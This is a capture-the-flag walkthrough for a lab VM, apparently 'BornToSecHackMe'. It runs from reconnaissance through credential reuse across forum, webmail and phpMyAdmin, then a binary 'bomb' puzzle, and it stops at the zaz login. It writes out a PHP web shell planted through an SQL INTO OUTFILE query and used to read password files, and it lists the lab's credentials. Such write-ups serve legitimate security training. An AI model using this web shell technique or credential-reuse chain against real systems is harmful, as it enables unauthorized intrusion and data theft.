we have the vm, and ze have to find the ip of the vm that's running the server
we make an ifconfig in our computer, and we find out :

vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::800:27ff:fe00:0  prefixlen 64  scopeid 0x20<link>

its the network of our virtualbox, so we make a nmap on it to see wish service are runing in this network :

nmap 192.168.56.0-255

we find :

Nmap scan report for 192.168.56.108
Host is up (0.00019s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps


we can see that the machine have the port 80 open, so a webservice is running

we can use the tool dirsearch to enumerate the potentiel link available in the adress 192.168.56.108

python dirsearch.py -u https://192.168.56.108

[16:04:29] Scanning: 
[16:04:36] 403 -   291B - /cgi-bin/
[16:04:38] 301 -   318B - /forum  ->  https://192.168.56.108/forum/
[16:04:38] 200 -    5KB - /forum/
[16:04:42] 301 -   323B - /phpmyadmin  ->  https://192.168.56.108/phpmyadmin/
[16:04:42] 200 -    7KB - /phpmyadmin/
[16:04:42] 200 -    7KB - /phpmyadmin/index.php
[16:04:44] 403 -   297B - /server-status/
[16:04:44] 403 -   296B - /server-status
[16:04:46] 301 -   320B - /webmail  ->  https://192.168.56.108/webmail/
[16:04:46] 403 -   309B - /webmail/src/configtest.php


we have 3 usable links : /forum/ /phpmyadmin/ /webmail

so we begin by https://192.168.56.108/forum/

we find a topic, that is called "Probleme login ?" created by user lmezard

it seems to be ssh-connection logs, when we browse this logs, we find this line :

Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2

so we can guess that lmezard entered the password instead of his username. we try to use this password to login in the forum :

Username : lmezard
Password : !q\]Ej?*5K5cy*AJ

We are logged in the forum

on the profile page of lmezard we find her mail : laurie@borntosec.net

We can try to login on webmail

Name : laurie@borntosec.net
Password : !q\]Ej?*5K5cy*AJ

we find a mail with the object : DB access

the login for DB is :

Username : root
Password : Fg-'kKXBj87E:aJ$

Now we can go on https://192.168.56.108/phpmyadmin/

we run the SQL command : SELECT "<?php system($_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/exploit.php"

to create a file exploit.php, that will execute what we give in the parameter 'cmd'
Now we can browse the folder of our server

so we make :

https://192.168.56.101/forum/templates_c/exploit.php?cmd=ls%20/home

and find :
LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz 

we go to LOOKATME

https://192.168.56.108/forum/templates_c/exploit.php?cmd=ls%20/home/LOOKATME

we find :

password

we want to cat this file :

https://192.168.56.108/forum/templates_c/exploit.php?cmd=cat%20/home/LOOKATME/password

and we finaly find :

lmezard:G!@M6f4Eatau{sF"

We try to login on the ftp service that runs on port 21

ftp 192.168.56.108

username : lmezard
password : G!@M6f4Eatau{sF"

ftp>ls

we find : README fun

ftp>get README
ftp>get fun

cat README :

Complete this little challenge and use the result as password for user 'laurie' to login in ssh

file fun 
fun: POSIX tar archive (GNU)

we can see that the fun file is a tar

we decompress it : tar -xf fun
we obtain the folder ft_fun

and we find 750 file on it

I print all files with : cat *

and I find a main :

int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}


So now we have just to find all the "getme*"
I copy the result of the cat on vscode and i make ctrl + f to find the getme*
with this methode we find :

char getme8() {
	return 'w';
}
char getme9() {
	return 'n';
}
char getme10() {
	return 'a';
}
char getme11() {
	return 'g';
}
char getme12()
{
	return 'e';
}

there are many getme() that are splited but we have the file numbers in eatch end of file, so we can easily find out

char getme1()
{
    return 'I';
}
char getme7()
{
    return 'p';
}
char getme4()
{
    return 'a';
}
char getme5()
{
    return 'r';
}
char getme6()
{
    return 't';
}
char getme3()
{
    return 'e';
}
char getme2()
{
    return 'h';
}

so we can get :

MY PASSWORD IS : Iheartpwnage
Now SHA-256 it and submit

We crypt Iheartpwnage with SHA-256 and we obtain :
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

we can try the ssh connection now on laurie@192.168.56.108 with the password
we are finally connected

we have 2 files : bomb and README
we cat the readme and get :

Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).

we download the bomb :

scp -P 22 laurie@192.168.56.108:/home/laurie/bomb .

and we put in on dogbolt, we can see there is 6 phases

the first phase is just waiting for the string : "Public speaking is very easy."

For the phase_2 I reproduce the script in C and i get :

1 2 6 24 120 720

For the phase 3, we just need to match one case so :

0 q 777
or
0 b 214

For the phase 4, I made another script that reproduce the bomb functionnement and i found :

9

For the phase 5, I decompiled the file with kuna and found a substitution tab at the adress 0x804b220
i open boom with gdb and a looked for what this address is containing : x/s 0x804b220
and i find : isrveawhobpnutfg

opekmq

for the phase 6, we can read on binarynindja that the program is waiting for 6 values between 1 and 5, and search for a specific
order of this number, so i brutforce, the phase with this script :

cat > test.py <<'PY'
# -*- coding: utf-8 -*-

import itertools
import subprocess

phases = [
    "Public speaking is very easy.",
    "1 2 6 24 120 720",
    "0 q 777",
    "9",
    "opekmq"
]

for perm in itertools.permutations(range(1, 7)):
    phase6 = " ".join(map(str, perm))
    stdin_data = "\n".join(phases + [phase6]) + "\n"

    print("Test : " + phase6)

    process = subprocess.Popen(
        ["/home/laurie/bomb"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    stdout, stderr = process.communicate(stdin_data)

    if "BOOM" not in stdout:
        print("====================")
        print("TROUVE : " + phase6)
        print("====================")
        print(stdout)
        break
PY


4 2 6 3 1 5

the ssh thor password is a concatenation of all phase result : Publicspeakingisveryeasy.126241207201b2149opekmq426135

we connect to thor and we find a file turtle with instruction like :

Tourne droite de 1 degrees
Avance 1 spaces
Tourne droite de 1 degrees
Avance 1 spaces

and a readme that says the password obtained is zaz's password


We are going to use the library python turtle to translate that in real code.
we get the file in our machine with : 

scp -P 22 thor@192.168.56.108:/home/thor/turtle .
we rename it instructions and find out the word 'SLASH' drawed with turtle library

digest is a hint to md5 encryption, so we use is the encrypt 'SLASH'

we find : 646da671ca01bb5d84dbb5fb2238dc8e

it is zaz's password

We connect to zaz




